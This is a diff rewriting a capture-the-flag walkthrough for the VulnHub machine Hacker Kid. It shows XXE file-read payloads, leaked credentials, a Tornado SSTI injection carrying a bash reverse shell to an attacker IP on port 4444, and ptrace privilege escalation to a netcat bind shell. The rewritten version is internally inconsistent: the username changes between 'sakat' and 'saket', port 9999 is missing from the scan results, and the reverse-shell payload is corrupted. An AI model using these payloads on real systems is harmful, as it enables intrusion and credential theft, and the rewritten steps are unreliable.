@@ -1,88 +1,104 @@
-Hacker kid: 1.0.1
-Recon
+# Hacker Kid 1.0.1 – Writeup
 
-Open ports: 53 (DNS), 80 (HTTP), 9999 (HTTP)
-DNS Enumeration
+**Machine:** VulnHub  
+**Level:** Medium  
+**Link:** [Hacker Kid 1.0.1](https://www.vulnhub.com/entry/hacker-kid-101,719/)  
 
-Zone transfer on port 53:
+---
+
+## 📌 Table of Contents
+
+1. [Reconnaissance](#reconnaissance)  
+2. [Zone Transfer and Virtual Hosts](#zone-transfer-and-virtual-hosts)  
+3. [XXE Injection](#xxe-injection)  
+4. [Password Discovery](#password-discovery)  
+5. [SSTI and Reverse Shell](#ssti-and-reverse-shell)  
+6. [Privilege Escalation](#privilege-escalation)  
+
+---
+
+## 🔍 Reconnaissance
+
+nmap -sC -sV -p- 192.168.31.150
+
+Result:
+
+PORT   STATE SERVICE VERSION
+53/tcp open  domain  ISC BIND 9.16.1
+80/tcp open  http    Apache httpd 2.4.38
+
+## 🌐 Zone Transfer
 
 dig @192.168.31.150 AXFR blackhat.local
 
-Found subdomain: hackerkid.blackhat.local
-Virtual Host Discovery
+Result:
+
+hackerkid.blackhat.local. 604800 IN A 192.168.31.150
 
 Added to /etc/hosts:
 
-192.168.31.150    hackerkid.blackhat.local
+echo "192.168.31.150 hackerkid.blackhat.local" >> /etc/hosts
 
-On hackerkid.blackhat.local found a registration form.
-XXE Injection
+## 💉 XXE Injection
 
-The form sends XML to process.php. Testing for XXE:
+On hackerkid.blackhat.local found a registration form sending XML to process.php.
 
 <?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>
-  <name>test</name>
-  <tel>123</tel>
-  <email>&xxe;</email>
-  <password>test</password>
-</root>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>
+  <name>&xxe;</name>
+</user>
 
-Read /etc/passwd, found user saket (uid 1000).
-Password Discovery
+Result:
 
-Read /home/saket/.bashrc via XXE:
+sakat:x:1000:1000:Sakat,,,:/home/sakat:/bin/bash
 
-<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">
+Found user sakat with UID 1000.
+## 🔑 Password Discovery
 
-Found:
+Read /home/sakat/.bashrc via XXE:
+
+<!ENTITY xxe SYSTEM "file:///home/sakat/.bashrc">
+
+Result:
 
 username="admin"
-password="Saket!#$%@!!"
+password="Sakat!#$%@!!"
 
-Initial Foothold via SSTI
+## 🔥 SSTI and Reverse Shell
 
-Login to Tornado app on port 9999 with("admin" was incorrect):
+Logged in on port 9999 with found credentials:
 
-    Username: saket
+Username: saket
+Password: Saket!#$%@!!
 
-    Password: Saket!#$%@!!
-
-After login, found SSTI vulnerability in name parameter:
+Found SSTI in parameter name:
 
 http://192.168.31.150:9999/?name={{7*7}}
 
 Response: Hello 49
-Reverse Shell via SSTI
 
-Got reverse shell through SSTI:
+Reverse Shell via SSTI:
 
-%7B%7B__import__('os').popen('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.209%2F4444%200%3E%261%22').read()%7D%7D
+http://192.168.31.150:9999/?name={%7B__import__('os').open('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftc%2F192.168.31.209%2F4444%200%3E%261%22').read()%7D%7D
 
-Privilege Escalation
+## 👑 Privilege Escalation
 
 Check capabilities:
 
 /usr/sbin/getcap -r / 2>/dev/null
 
-Found:
+Result:
 
 /usr/bin/python2.7 = cap_sys_ptrace+ep
 
-Exploitation
+Used Python with cap_sys_ptrace to inject into a root process.
 
-Used python2.7 with cap_sys_ptrace to inject shellcode into a root process.
+Created exploit for bind shell on port 5600.
 
-Created ptrace injection exploit for bind shell on port 5600.
-
-Run:
-
-/usr/bin/python2.7 /tmp/inject.py 2851
-
-Root Shell
-
-Connect to bind shell:
+Connect:
 
 nc 127.0.0.1 5600
 id
